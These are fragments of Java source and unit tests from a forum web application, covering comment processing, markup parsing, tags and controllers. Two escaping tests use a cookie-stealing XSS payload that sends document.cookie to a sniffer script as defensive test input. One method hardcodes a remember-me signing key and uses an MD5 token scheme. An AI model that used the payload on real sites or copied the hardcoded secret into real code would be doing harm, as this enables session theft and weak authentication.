public void addMultiplyTagsTest ( ) { UserTagService mockUserTagService = mock ( UserTagService . class ) ; when ( mockUserTagService . addMultiplyTags ( any ( User . class ) , anyString ( ) , anyBoolean ( ) ) ) . thenCallRealMethod ( ) ; when ( mockUserTagService . parseTags ( anyString ( ) , any ( Errors . class ) ) ) . thenCallRealMethod ( ) ; try { doThrow ( new TagNotFoundException ( ) ) . when ( mockUserTagService ) . favoriteAdd ( eq ( user ) , eq ( " uytutut " ) ) ; doThrow ( new DuplicateKeyException ( " duplicate " ) ) . when ( mockUserTagService ) . favoriteAdd ( eq ( user ) , eq ( " tag3 " ) ) ; } catch ( Exception e ) { } List < String > strErrors = mockUserTagService . addMultiplyTags ( user , " tag1, tag2, tag3, uytutut, @#$%$# " , true ) ; try { verify ( mockUserTagService ) . favoriteAdd ( eq ( user ) , eq ( " tag1 " ) ) ; verify ( mockUserTagService ) . favoriteAdd ( eq ( user ) , eq ( " tag2 " ) ) ; verify ( mockUserTagService ) . favoriteAdd ( eq ( user ) , eq ( " uytutut " ) ) ; verify ( mockUserTagService , never ( ) ) . favoriteAdd ( eq ( user ) , eq ( " @#$%$# " ) ) ; verify ( mockUserTagService , never ( ) ) . ignoreAdd ( any ( User . class ) , anyString ( ) ) ; } catch ( Exception e ) { } Assert . assertEquals ( 3 , strErrors . size ( ) ) ; reset ( mockUserTagService ) ; when ( mockUserTagService . addMultiplyTags ( any ( User . class ) , anyString ( ) , anyBoolean ( ) ) ) . thenCallRealMethod ( ) ; when ( mockUserTagService . parseTags ( anyString ( ) , any ( Errors . class ) ) ) . thenCallRealMethod ( ) ; try { doThrow ( new TagNotFoundException ( ) ) . when ( mockUserTagService ) . ignoreAdd ( eq ( user ) , eq ( " uytutut " ) ) ; doThrow ( new DuplicateKeyException ( " duplicate " ) ) . when ( mockUserTagService ) . ignoreAdd ( eq ( user ) , eq ( " tag3 " ) ) ; } catch ( Exception e ) { } strErrors = mockUserTagService . addMultiplyTags ( user , " tag1, tag2, tag3, uytutut, @#$%$# " , false ) ; try { verify ( mockUserTagService ) . ignoreAdd ( eq ( user ) , eq ( " tag1 " ) ) ; verify ( mockUserTagService ) . ignoreAdd ( eq ( user ) , eq ( " tag2 " ) ) ; verify ( mockUserTagService ) . ignoreAdd ( eq ( user ) , eq ( " uytutut " ) ) ; verify ( mockUserTagService , never ( ) ) . ignoreAdd ( eq ( user ) , eq ( " @#$%$# " ) ) ; verify ( mockUserTagService , never ( ) ) . favoriteAdd ( any ( User . class ) , anyString ( ) ) ; } catch ( Exception e ) { } Assert . assertEquals ( 3 , strErrors . size ( ) ) ; } 
public ModelAndView showForm ( @RequestParam ( " section " ) int sectionId ) { Map < String , Object > params = new HashMap < String , Object > ( ) ; params . put ( " sectionId " , sectionId ) ; Section section = sectionService . getSection ( sectionId ) ; params . put ( " section " , section ) ; params . put ( " info " , sectionService . getAddInfo ( section . getId ( ) ) ) ; params . put ( " groups " , groupDao . getGroups ( section ) ) ; return new ModelAndView ( " add-section " , params ) ; } 
public int addToMemories ( User user , Topic topic , boolean watch ) { try { return doAddToMemories ( user , topic , watch ) ; 
private int doAddToMemories ( User user , Topic topic , boolean watch ) { int id = getId ( user , topic , watch ) ; if ( id = = 0 ) { return insertTemplate . executeAndReturnKey ( ImmutableMap . < String , Object > of ( 
public String format ( String text , boolean secure ) { String escapedText = StringUtil . escapeHtml ( text . replaceAll ( MDASH_REGEX , MDASH_REPLACE ) ) ; StringTokenizer st = new StringTokenizer ( escapedText , " " , true ) ; StringBuilder sb = new StringBuilder ( ) ; while ( st . hasMoreTokens ( ) ) { String token = st . nextToken ( ) ; String formattedToken = formatURL ( token , secure ) ; sb . append ( formattedToken ) ; } return sb . toString ( ) ; } 
public void pTest ( ) { assertEquals ( " <p>test ntest1</p><p>test2</p> " , lorCodeService . parseComment ( " test ntest1 ntest2 " , false ) ) ; 
public void tagEscapeTest ( ) { assertEquals ( " <p>&lt;br&gt;</p> " , lorCodeService . parseComment ( " <br> " , false ) ) ; 
public void urlEscapeTest ( ) { assertEquals ( " <p><s title= \" javascript:var c=new Image();c.src=&quot;http:127.0.0.1/sniffer.pl?&quot;+document.cookie;close() \" >Test</s></p> " , lorCodeService . parseComment ( " [url=javascript:var c=new Image();c.src= \" http:127.0.0.1/sniffer.pl? \" +document.cookie;close()]Test[/url] " , false ) ) ; assertEquals ( " <p><s>javascript:var c=new Image();c.src=&quot;http:127.0.0.1/sniffer.pl?&quot;+document.cookie;close()</s></p> " , lorCodeService . parseComment ( " [url]javascript:var c=new Image();c.src= \" http:127.0.0.1/sniffer.pl? \" +document.cookie;close()[/url] " , false ) ) ; 
public void urlEscapeWithTagsTest ( ) { assertEquals ( " <p><s title= \" javascript:var c=new Image();c.src=&quot;http:127.0.0.1/sniffer.pl?&quot;+document.cookie;close() \" >T<i>e</i>st</s></p> " , lorCodeService . parseComment ( " [url=javascript:var c=new Image();c.src= \" http:127.0.0.1/sniffer.pl? \" +document.cookie;close()]T[i]e[/i]st[/url] " , false ) ) ; 
public void badListTest ( ) { assertEquals ( " <p>0</p><ul><li>1</li><li>2</li></ul> " , lorCodeService . parseComment ( " [list]0[*]1[*]2[/list] " , false ) ) ; 
public void codeEscapeTest ( ) { assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>&quot;code&amp;code&quot;</code></pre></div> " , lorCodeService . parseComment ( " [code] \" code&code \" [/code] " , false ) ) ; 
public void testMDash ( ) { assertEquals ( " test&nbsp;&mdash; test " , toHtmlFormatter . format ( " test -- test " , false ) ) ; assertEquals ( " <p>test&nbsp;&mdash; test</p> " , lorCodeService . parseComment ( " test -- test " , false ) ) ; assertEquals ( " <p>test<div class= \" code \" ><pre class= \" no-highlight \" ><code> -- </code></pre></div>test</p> " , lorCodeService . parseComment ( " test[code] -- [/code]test " , false ) ) ; 
public ModelAndView showTagListHandler ( @PathVariable String firstLetter , HttpServletRequest request ) throws TagNotFoundException { ModelAndView modelAndView = new ModelAndView ( " tags " ) ; Template tmpl = Template . getTemplate ( request ) ; modelAndView . addObject ( " isModeratorSession " , tmpl . isModeratorSession ( ) ) ; SortedSet < String > firstLetters = tagService . getFirstLetters ( ! tmpl . isModeratorSession ( ) ) ; modelAndView . addObject ( " firstLetters " , firstLetters ) ; if ( Strings . isNullOrEmpty ( firstLetter ) ) { firstLetter = firstLetters . first ( ) ; } modelAndView . addObject ( " currentLetter " , firstLetter ) ; Map < String , Integer > tags = tagService . getTagsByFirstLetter ( firstLetter ) ; if ( tags . size ( ) = = 0 ) { throw new TagNotFoundException ( " Tag list is empty " ) ; } modelAndView . addObject ( " tags " , tags ) ; return modelAndView ; } 
List < String > showTagListHandlerJSON ( @RequestParam ( " term " ) final String term ) { Map < String , Integer > tags = tagService . getTagsByFirstLetter ( term . substring ( 0 , 1 ) ) ; return ImmutableList . copyOf ( Iterables . filter ( tags . keySet ( ) , new Predicate < String > ( ) { @Override 
public ModelAndView showTagListHandler ( @PathVariable String firstLetter ) throws TagNotFoundException { ModelAndView modelAndView = new ModelAndView ( " tags " ) ; SortedSet < String > firstLetters = tagService . getFirstLetters ( ) ; modelAndView . addObject ( " firstLetters " , firstLetters ) ; if ( Strings . isNullOrEmpty ( firstLetter ) ) { firstLetter = firstLetters . first ( ) ; } modelAndView . addObject ( " currentLetter " , firstLetter ) ; Map < String , Integer > tags = tagService . getTagsByFirstLetter ( firstLetter ) ; if ( tags . size ( ) = = 0 ) { throw new TagNotFoundException ( " Tag list is empty " ) ; } modelAndView . addObject ( " tags " , tags ) ; return modelAndView ; } 
public ModelAndView showDefaultTagListHandlertags ( ) throws TagNotFoundException { return showTagListHandler ( " " ) ; } 
public int doAfterBody ( ) throws JspException { try { BodyContent bc = getBodyContent ( ) ; String body = bc . getString ( ) ; JspWriter out = bc . getEnclosingWriter ( ) ; out . print ( makeTitle ( body ) ) ; } catch ( IOException e ) { throw new JspException ( " Error: " + e . getMessage ( ) ) ; } return SKIP_BODY ; } 
public int doAfterBody ( ) throws JspException { try { BodyContent bc = getBodyContent ( ) ; String body = bc . getString ( ) ; JspWriter out = bc . getEnclosingWriter ( ) ; if ( body ! = null & & ! body . trim ( ) . isEmpty ( ) ) { out . print ( processTitle ( body ) ) ; } } catch ( IOException e ) { throw new JspException ( " Error: " + e . getMessage ( ) ) ; } return SKIP_BODY ; } 
public static String processTitle ( String title ) { return title . replace ( ToHtmlFormatter . MDASH_REGEX , ToHtmlFormatter . MDASH_REPLACE ) ; } 
public void requestValidator ( WebDataBinder binder ) { commentService . requestValidator ( binder ) ; } 
public void initBinder ( WebDataBinder binder ) { commentService . initBinder ( binder ) ; } 
public void requestValidator ( WebDataBinder binder ) { binder . setValidator ( new CommentRequestValidator ( ) ) ; binder . setBindingErrorProcessor ( new ExceptionBindingErrorProcessor ( ) ) ; } 
public void initBinder ( WebDataBinder binder ) { binder . registerCustomEditor ( Topic . class , new PropertyEditorSupport ( ) { @Override public void setAsText ( String text ) throws IllegalArgumentException { try { setValue ( messageDao . getById ( Integer . parseInt ( text . split ( " , " ) [ 0 ] ) ) ) ; } catch ( MessageNotFoundException e ) { throw new IllegalArgumentException ( e ) ; } } } ) ; binder . registerCustomEditor ( Comment . class , new PropertyEditorSupport ( ) { @Override public void setAsText ( String text ) throws IllegalArgumentException { if ( text . isEmpty ( ) | | " 0 " . equals ( text ) ) { setValue ( null ) ; return ; } try { setValue ( commentDao . getById ( Integer . parseInt ( text ) ) ) ; } catch ( MessageNotFoundException e ) { throw new IllegalArgumentException ( e ) ; } } } ) ; binder . registerCustomEditor ( User . class , new UserPropertyEditor ( userDao ) ) ; } 
public void setAsText ( String text ) throws IllegalArgumentException { try { setValue ( messageDao . getById ( Integer . parseInt ( text . split ( " , " ) [ 0 ] ) ) ) ; 
private String processMessage ( String msg , String mode ) { if ( " ntobr " . equals ( mode ) ) { return toLorCodeFormatter . format ( msg , true ) ; 
public Comment getById ( int id ) throws MessageNotFoundException { return commentDao . getById ( id ) ; } 
private String makeLogString ( String message , String remoteAddress , String xForwardedFor ) { StringBuilder logMessage = new StringBuilder ( ) ; logMessage . append ( message ) . append ( " ; ip: " ) . append ( remoteAddress ) ; if ( xForwardedFor ! = null ) { logMessage . append ( " XFF: " ) . append ( xForwardedFor ) ; } return logMessage . toString ( ) ; } 
public void updateComment ( final int msgid ) { Preconditions . checkArgument ( msgid ! = 0 , " msgid==0!? " ) ; jmsTemplate . send ( queue , new MessageCreator ( ) { @Override 
public boolean preHandle ( HttpServletRequest request , HttpServletResponse response , Object handler ) throws Exception { if ( handler instanceof ResourceHttpRequestHandler | | handler instanceof DefaultServletHttpRequestHandler ) { return true ; } CommonsLogStopWatch watch = new CommonsLogStopWatch ( handler . getClass ( ) . getSimpleName ( ) ) ; watch . setTimeThreshold ( TIME_THRESHOLD ) ; request . setAttribute ( ATTRIBUTE , watch ) ; return true ; } 
public void postHandle ( HttpServletRequest request , HttpServletResponse response , Object handler , ModelAndView modelAndView ) throws Exception { StopWatch stopWatch = ( StopWatch ) request . getAttribute ( ATTRIBUTE ) ; if ( stopWatch ! = null ) { stopWatch . stop ( ) ; 
private void createCookies ( HttpServletResponse response , HttpSession session , User user ) { Cookie cookie = new Cookie ( " password " , user . getMD5 ( configuration . getSecret ( ) ) ) ; cookie . setMaxAge ( 60 * 60 * 24 * 31 * 24 ) ; cookie . setPath ( " / " ) ; cookie . setHttpOnly ( true ) ; response . addCookie ( cookie ) ; Cookie prof = new Cookie ( " profile " , user . getNick ( ) ) ; prof . setMaxAge ( 60 * 60 * 24 * 31 * 12 ) ; prof . setPath ( " / " ) ; response . addCookie ( prof ) ; user . acegiSecurityHack ( response , session ) ; } 
public void acegiSecurityHack ( HttpServletResponse response , HttpSession session ) { String username = nick ; String cookieName = "ACEGI_SECURITY_HASHED_REMEMBER_ME_COOKIE"; ACEGI_SECURITY_HASHED_REMEMBER_ME_COOKIE_KEY; String cookieName = LoginController.ACEGI_COOKIE_NAME; ACEGI_SECURITY_HASHED_REMEMBER_ME_COOKIE_KEY; long tokenValiditySeconds = 1209600; 14 days String key = "jam35Wiki"; from applicationContext-acegi-security.xml long expiryTime = System.currentTimeMillis() + (tokenValiditySeconds * 1000); construct token to put in cookie; format is: username + ":" + expiryTime + ":" + Md5Hex(username + ":" + expiryTime + ":" + password + ":" + key) String signatureValue = StringUtil.md5hash(username + ':' + expiryTime + ':' + password + ':' + key); String tokenValue = username + ':' + expiryTime + ':' + signatureValue; String tokenValueBase64 = new String(Base64.encodeBase64(tokenValue.getBytes())); Add remember me cookie Cookie acegi = new Cookie(cookieName, tokenValueBase64); acegi.setMaxAge(Long.valueOf(expiryTime).intValue()); acegi.setPath("/wiki"); acegi.setHttpOnly(true); response.addCookie(acegi); Remove ACEGI_SECURITY_CONTEXT and session session.removeAttribute("ACEGI_SECURITY_CONTEXT"); if any } 
public ModelAndView tagFeed ( HttpServletRequest request , TopicListRequest topicListForm , HttpServletResponse response , @PathVariable String tag ) throws Exception { topicListForm . setTag ( tag ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( request , topicListForm , response , null ) ; boolean rss = topicListForm . getOutput ( ) ! = null & & " rss " . equals ( topicListForm . getOutput ( ) ) ; if ( ! rss ) { modelAndView . addObject ( " sectionList " , sectionService . getSectionList ( ) ) ; } Template tmpl = Template . getTemplate ( request ) ; if ( tmpl . isSessionAuthorized ( ) ) { modelAndView . addObject ( " isShowFavoriteTagButton " , ! userTagService . hasFavoriteTag ( tmpl . getCurrentUser ( ) , topicListForm . getTag ( ) ) ) ; modelAndView . addObject ( " isShowUnFavoriteTagButton " , userTagService . hasFavoriteTag ( tmpl . getCurrentUser ( ) , topicListForm . getTag ( ) ) ) ; if ( ! tmpl . isModeratorSession ( ) ) { modelAndView . addObject ( " isShowIgnoreTagButton " , ! userTagService . hasIgnoreTag ( tmpl . getCurrentUser ( ) , topicListForm . getTag ( ) ) ) ; modelAndView . addObject ( " isShowUnIgnoreTagButton " , userTagService . hasIgnoreTag ( tmpl . getCurrentUser ( ) , topicListForm . getTag ( ) ) ) ; } } modelAndView . addObject ( " counter " , tagService . getCounter ( tag ) ) ; modelAndView . addObject ( " url " , tagListUrl ( tag ) ) ; modelAndView . addObject ( " params " , null ) ; modelAndView . setViewName ( " tag-topics " ) ; return modelAndView ; } 
public ModelAndView gallery ( HttpServletRequest request , TopicListRequest topicListForm , HttpServletResponse response ) throws Exception { topicListForm . setSection ( Section . SECTION_GALLERY ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( request , topicListForm , response , null ) ; modelAndView . addObject ( " url " , " /gallery/ " ) ; modelAndView . addObject ( " params " , null ) ; return modelAndView ; } 
public ModelAndView forum ( HttpServletRequest request , TopicListRequest topicListForm , HttpServletResponse response ) throws Exception { topicListForm . setSection ( Section . SECTION_FORUM ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( request , topicListForm , response , null ) ; modelAndView . addObject ( " url " , " /forum/lenta " ) ; modelAndView . addObject ( " params " , null ) ; return modelAndView ; } 
public ModelAndView polls ( HttpServletRequest request , TopicListRequest topicListForm , HttpServletResponse response ) throws Exception { topicListForm . setSection ( Section . SECTION_POLLS ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( request , topicListForm , response , null ) ; modelAndView . addObject ( " url " , " /polls/ " ) ; modelAndView . addObject ( " params " , null ) ; return modelAndView ; } 
public ModelAndView news ( HttpServletRequest request , TopicListRequest topicListForm , HttpServletResponse response ) throws Exception { topicListForm . setSection ( Section . SECTION_NEWS ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( request , topicListForm , response , null ) ; modelAndView . addObject ( " url " , " /news/ " ) ; modelAndView . addObject ( " params " , null ) ; return modelAndView ; } 
public ModelAndView galleryArchive ( HttpServletRequest request , TopicListRequest topicListForm , @PathVariable String section , @PathVariable int year , @PathVariable int month , HttpServletResponse response ) throws Exception { topicListForm . setSection ( Section . getSection ( section ) ) ; topicListForm . setYear ( year ) ; topicListForm . setMonth ( month ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( request , topicListForm , response , null ) ; modelAndView . addObject ( " url " , " /gallery/archive/ " + year + '/' + month + '/' ) ; modelAndView . addObject ( " params " , null ) ; return modelAndView ; } 
private ModelAndView group ( HttpServletRequest request , TopicListRequest topicListForm , String groupName , HttpServletResponse response ) throws Exception { Section section = sectionService . getSection ( topicListForm . getSection ( ) ) ; Group group = groupDao . getGroup ( section , groupName ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( request , topicListForm , response , group ) ; modelAndView . addObject ( " url " , group . getUrl ( ) ) ; modelAndView . addObject ( " params " , null ) ; return modelAndView ; } 
public PreparedComment prepareComment ( Comment comment , boolean secure ) throws UserNotFoundException { return prepareComment ( comment , null , secure , false ) ; } 
public List < PreparedComment > prepareCommentListRSS ( CommentList comments , List < Comment > list , boolean secure ) throws UserNotFoundException { List < PreparedComment > commentsPrepared = new ArrayList < PreparedComment > ( list . size ( ) ) ; for ( Comment comment : list ) { commentsPrepared . add ( prepareComment ( comment , comments , secure , true ) ) ; } return commentsPrepared ; } 
public List < PreparedComment > prepareCommentList ( CommentList comments , List < Comment > list , boolean secure ) throws UserNotFoundException { List < PreparedComment > commentsPrepared = new ArrayList < PreparedComment > ( list . size ( ) ) ; for ( Comment comment : list ) { commentsPrepared . add ( prepareComment ( comment , comments , secure , false ) ) ; } return commentsPrepared ; } 
private String prepareCommentText ( MessageText messageText , final boolean secure ) { if ( messageText . isLorcode ( ) ) { return lorCodeService . parseComment ( messageText . getText ( ) , secure ) ; 
private String prepareCommentTextRSS ( MessageText messageText , final boolean secure ) { return lorCodeService . prepareTextRSS ( messageText . getText ( ) , secure , messageText . isLorcode ( ) ) ; } 
private PreparedComment prepareComment ( Comment comment , CommentList comments , boolean secure , boolean rss ) throws UserNotFoundException { MessageText messageText = msgbaseDao . getMessageText ( comment . getId ( ) ) ; return prepareComment ( messageText , comment , comments , secure , rss ) ; } 
public List < PreparedComment > prepareCommentList ( CommentList comments , List < Comment > list , boolean secure ) throws UserNotFoundException { if ( list . isEmpty ( ) ) { return ImmutableList . of ( ) ; } Map < Integer , MessageText > texts = msgbaseDao . getMessageText ( Lists . newArrayList ( Iterables . transform ( list , new Function < Comment , Integer > ( ) { @Override public Integer apply ( Comment comment ) { return comment . getId ( ) ; } } ) ) ) ; List < PreparedComment > commentsPrepared = new ArrayList < PreparedComment > ( list . size ( ) ) ; for ( Comment comment : list ) { MessageText text = texts . get ( comment . getId ( ) ) ; commentsPrepared . add ( prepareComment ( text , comment , comments , secure , false ) ) ; } return commentsPrepared ; } 
public Integer apply ( Comment comment ) { return comment . getId ( ) ; } 
public void processRow ( ResultSet resultSet ) throws SQLException { String text = resultSet . getString ( " message " ) ; boolean lorcode = resultSet . getBoolean ( " bbcode " ) ; out . put ( resultSet . getInt ( " id " ) , new MessageText ( text , lorcode ) ) ; } 
public ModelAndView galleryArchive ( HttpServletRequest request , @PathVariable String section , @PathVariable int year , @PathVariable int month , HttpServletResponse response ) throws Exception { TopicListRequest topicListForm = new TopicListRequest ( ) ; topicListForm . setSection ( Section . getSection ( section ) ) ; topicListForm . setYear ( year ) ; topicListForm . setMonth ( month ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( request , topicListForm , response , null ) ; modelAndView . addObject ( " url " , " /gallery/archive/ " + year + '/' + month + '/' ) ; modelAndView . addObject ( " params " , null ) ; return modelAndView ; } 
public void edit ( final Comment oldComment , final Comment newComment , final String commentBody ) { jdbcTemplate . update ( " UPDATE comments SET title=? WHERE id=? " , newComment . getTitle ( ) , oldComment . getId ( ) ) ; jdbcTemplate . update ( " UPDATE msgbase SET message=? WHERE id=? " , 
public Boolean isModeratorAllowedToEditComments ( ) { String property = properties . getProperty ( " comment.isModeratorAllowedToEdit " ) ; if ( property = = null ) return false ; return Boolean . valueOf ( property ) ; } 
public boolean isCommentsEditingAllowed ( CommentRequest commentRequest , HttpServletRequest request , User user , Errors errors ) { Template tmpl = Template . getTemplate ( request ) ; Boolean editable = tmpl . isModeratorSession ( ) & & configuration . isModeratorAllowedToEditComments ( ) ; if ( ! editable ) { editable = commentRequest . getOriginal ( ) . getUserid ( ) = = user . getId ( ) ; } return editable ; } 
private boolean doDeleteComment ( int msgid , String reason , User user , int scoreBonus ) { int inReplyId = jdbcTemplate . queryForInt ( " SELECT replyto FROM comments WHERE id=? AND NOT deleted " , msgid ) ; int deleteCount = jdbcTemplate . update ( deleteComment , msgid ) ; if ( deleteCount > 0 ) { deleteInfoDao . insert ( msgid , user , reason , scoreBonus ) ; 
public boolean isHaveAnswers ( int commentId ) { int answersCount = jdbcTemplate . queryForInt ( " select count (id) from comments where replyto = ? " , commentId ) ; return answersCount ! = 0 ; } 
public boolean isHaveAnswers ( ) { return haveAnswers ; } 
private PreparedComment prepareComment ( Comment comment , CommentList comments , boolean secure , boolean rss ) throws UserNotFoundException { MessageText messageText = msgbaseDao . getMessageText ( comment . getId ( ) ) ; return prepareComment ( messageText , comment , comments , secure , rss ) ; } 
public PreparedComment prepareComment ( Comment comment , String message , boolean secure ) throws UserNotFoundException { User author = userDao . getUserCached ( comment . getUserid ( ) ) ; String processedMessage = lorCodeService . parseComment ( message , secure ) ; return new PreparedComment ( comment , author , processedMessage , null , commentService . isHaveAnswers ( comment ) ) ; } 
public boolean isHaveAnswers ( Comment comment ) { return commentDao . isHaveAnswers ( comment . getId ( ) ) ; } 
public Boolean isCommentEditingAllowedIfAnswersExists ( ) { String property = properties . getProperty ( " comment.isEditingAllowedIfAnswersExists " ) ; if ( property = = null ) return false ; return Boolean . valueOf ( property ) ; } 
public void processRow ( ResultSet resultSet ) throws SQLException { EditHistoryDto editHistoryDto = new EditHistoryDto ( ) ; editHistoryDto . setId ( resultSet . getInt ( " id " ) ) ; editHistoryDto . setMsgid ( resultSet . getInt ( " msgid " ) ) ; editHistoryDto . setEditor ( resultSet . getInt ( " editor " ) ) ; editHistoryDto . setOldmessage ( resultSet . getString ( " oldmessage " ) ) ; editHistoryDto . setEditdate ( resultSet . getTimestamp ( " editdate " ) ) ; editHistoryDto . setOldtitle ( resultSet . getString ( " oldtitle " ) ) ; editHistoryDto . setOldtags ( resultSet . getString ( " oldtags " ) ) ; editHistoryDto . setObjectType ( resultSet . getString ( " object_type " ) ) ; editInfoDTOs . add ( editHistoryDto ) ; } 
public ModelAndView showCommentEditInfo ( HttpServletRequest request , @PathVariable ( " id " ) int msgid , @PathVariable ( " commentid " ) int commentId ) throws Exception { Topic message = messageDao . getById ( msgid ) ; Comment comment = commentService . getById ( commentId ) ; List < PreparedEditHistory > editHistories = editHistoryService . prepareEditInfo ( comment , request . isSecure ( ) ) ; ModelAndView modelAndView = new ModelAndView ( " history " ) ; List < String > javaScriptsForLayout = new ArrayList < String > ( ) ; javaScriptsForLayout . add ( " diff_match_patch.js " ) ; javaScriptsForLayout . add ( " lor_view_diff_history.js " ) ; modelAndView . addObject ( " javascriptsForLayout " , javaScriptsForLayout ) ; modelAndView . getModel ( ) . put ( " message " , message ) ; modelAndView . getModel ( ) . put ( " editHistories " , editHistories ) ; return modelAndView ; } 
public void updateLatestEditorInfo ( int id , int editorId , Date editDate , int editCount ) { jdbcTemplate . update ( " UPDATE comments set editor_id = ? , edit_date = ?, edit_count = ? WHERE id = ? " , 
public void updateLatestEditorInfo ( User editor , Comment original , Comment comment ) { List < EditHistoryDto > editHistoryDtoList = editHistoryService . getEditInfo ( original . getId ( ) , EditHistoryObjectTypeEnum . COMMENT ) ; int historySize = editHistoryDtoList . size ( ) ; if ( historySize = = 1 ) { historySize = 0 ; } commentDao . updateLatestEditorInfo ( original . getId ( ) , 
public boolean deleteComment ( int msgid , String reason , User user , int scoreBonus ) { int inReplyId = jdbcTemplate . queryForInt ( " SELECT replyto FROM comments WHERE id=? AND NOT deleted " , msgid ) ; int deleteCount = jdbcTemplate . update ( deleteComment , msgid ) ; if ( deleteCount > 0 ) { deleteInfoDao . insert ( msgid , user , reason , scoreBonus ) ; 
public void updateStatsAfterDelete ( int commentId , int count ) { int topicId = jdbcTemplate . queryForInt ( " SELECT topic FROM comments WHERE id=? " , commentId ) ; jdbcTemplate . update ( " UPDATE topics SET stat1=stat1-?, lastmod=CURRENT_TIMESTAMP WHERE id = ? " , count , topicId ) ; jdbcTemplate . update ( " UPDATE topics SET stat2=stat1 WHERE id=? AND stat2 > stat1 " , topicId ) ; jdbcTemplate . update ( " UPDATE topics SET stat3=stat1 WHERE id=? AND stat3 > stat1 " , topicId ) ; jdbcTemplate . update ( " UPDATE topics SET stat4=stat1 WHERE id=? AND stat4 > stat1 " , topicId ) ; int groupId = jdbcTemplate . queryForInt ( " SELECT groupid FROM topics WHERE id = ? " , topicId ) ; jdbcTemplate . update ( " UPDATE groups SET stat1=stat1-? WHERE id = ? " , count , groupId ) ; } 
public List < Integer > doDeleteReplys ( int msgid , User user , boolean score ) { List < Integer > deleted = deleteReplys ( msgid , user , score , 0 ) ; if ( ! deleted . isEmpty ( ) ) { updateStatsAfterDelete ( msgid , deleted . size ( ) ) ; } return deleted ; } 
public List < Integer > deleteReplys ( int msgid , User user , boolean score ) { return commentDao . doDeleteReplys ( msgid , user , score ) ; } 
public DeleteCommentResult deleteCommentsByIPAddress ( String ip , Timestamp timeDelta , final User moderator , final String reason ) { return commentDao . deleteCommentsByIPAddress ( ip , timeDelta , moderator , reason ) ; } 
public DeleteCommentResult deleteAllCommentsAndBlock ( User user , final User moderator , String reason ) { List < Integer > deletedTopicIds = new ArrayList < Integer > ( ) ; List < Integer > deletedCommentIds = new ArrayList < Integer > ( ) ; userDao . blockWithoutTransaction ( user , moderator , reason ) ; deletedTopicIds = messageDao . deleteAllByUser ( user , moderator ) ; deletedCommentIds = commentDao . deleteAllByUser ( user , moderator ) ; return new DeleteCommentResult ( deletedTopicIds , deletedCommentIds , null ) ; } 
private void reindexMessage ( int msgid , boolean withComments ) throws IOException , SolrServerException , MessageNotFoundException { Topic msg = messageDao . getById ( msgid ) ; if ( ! msg . isDeleted ( ) ) { updateMessage ( msg ) ; } else { logger.info("Deleting message "+msgid+" from solr"); solrServer.deleteById((Integer.toString(msg.getId()))); } if (withComments) { CommentList commentList = commentService.getCommentList(msg, true); 
public void getTopicsFeedYear_commonTest ( ) throws UserErrorException , TagNotFoundException { when ( tagService . getTagId ( " LOR " ) ) . thenReturn ( 123 ) ; List < Topic > topicList = topicListService . getTopicsFeed ( section1 , group , " LOR " , null , 2000 , 11 ) ; assertEquals ( 1 , topicListDto . getSections ( ) . size ( ) ) ; Integer sectionId = topicListDto . getSections ( ) . iterator ( ) . next ( ) ; assertEquals ( new Integer ( 11 ) , sectionId ) ; assertEquals ( 111 , topicListDto . getGroup ( ) ) ; assertEquals ( 123 , topicListDto . getTag ( ) ) ; assertEquals ( TopicListDto . DateLimitType . BETWEEN , topicListDto . getDateLimitType ( ) ) ; assertEquals ( TopicListDao . CommitMode . COMMITED_ONLY , topicListDto . getCommitMode ( ) ) ; } 
public CommentsListItem mapRow ( ResultSet rs , int rowNum ) throws SQLException { CommentsListItem item = new CommentsListItem ( ) ; item . setSectionTitle ( rs . getString ( " ptitle " ) ) ; item . setGroupTitle ( rs . getString ( " gtitle " ) ) ; item . setTopicId ( rs . getInt ( " topicid " ) ) ; item . setCommentId ( rs . getInt ( " msgid " ) ) ; item . setTitle ( StringUtil . makeTitle ( rs . getString ( " title " ) ) ) ; item . setPostdate ( rs . getTimestamp ( " postdate " ) ) ; return item ; } 
public DeletedListItem mapRow ( ResultSet rs , int rowNum ) throws SQLException { return new DeletedListItem ( rs ) ; } 
public void checkPostData ( ) throws Exception { CommentRequest commentRequest = new CommentRequest ( ) ; User user = new User ( Users . getUser1star ( ) ) ; HttpServletRequest request = mock ( HttpServletRequest . class ) ; Errors errors = new BindException ( commentRequest , " commentRequest " ) ; IPBlockInfo ipBlockInfo = new IPBlockInfo ( " 127.0.0.1 " ) ; commentService . checkPostData ( commentRequest , user , ipBlockInfo , request , errors ) ; } 
private void addComment ( int commentId , Integer replyToId , String title , String body ) { jdbcTemplate . update ( " INSERT INTO comments (id, userid, title, postdate, replyto, deleted, topic, postip, ua_id) " + " VALUES (?, ?, ?, CURRENT_TIMESTAMP, ?, 'f', ?, ?::inet, create_user_agent(?)) " , commentId , 1 , title , replyToId , topicId , " 127.0.0.1 " , " Integration test User Agent " ) ; jdbcTemplate . update ( " INSERT INTO msgbase (id, message, bbcode) VALUES (?, ?, true) " , 
private void delComment ( int commentId ) { jdbcTemplate . update ( " DELETE FROM msgbase WHERE id=? " , commentId ) ; jdbcTemplate . update ( " DELETE FROM user_events WHERE comment_id=? " , commentId ) ; jdbcTemplate . update ( " DELETE FROM comments WHERE id=? " , commentId ) ; } 
public void editCommentTest ( ) { int commentId = jdbcTemplate . queryForInt ( " select nextval('s_msgid') " ) ; try { addComment ( 
public void updateLatestEditorInfoTest ( ) { int commentId = jdbcTemplate . queryForInt ( " select nextval('s_msgid') " ) ; try { addComment ( 
public void isHaveAnswersTest ( ) { int commentId1 = jdbcTemplate . queryForInt ( " select nextval('s_msgid') " ) ; int commentId2 = jdbcTemplate . queryForInt ( " select nextval('s_msgid') " ) ; try { addComment ( 
private ModelAndView redirectToListPage ( String tagName ) { char firstLetter = tagName . toLowerCase ( ) . charAt ( 0 ) ; String redirectUrl = TopicListController . tagsUrl ( firstLetter ) ; ModelAndView modelAndView = new ModelAndView ( new RedirectView ( redirectUrl ) ) ; return modelAndView ; } 
public static String tagsUrl ( char letter ) { return TAGS_URI_TEMPLATE . expand ( letter ) . toString ( ) ; } 
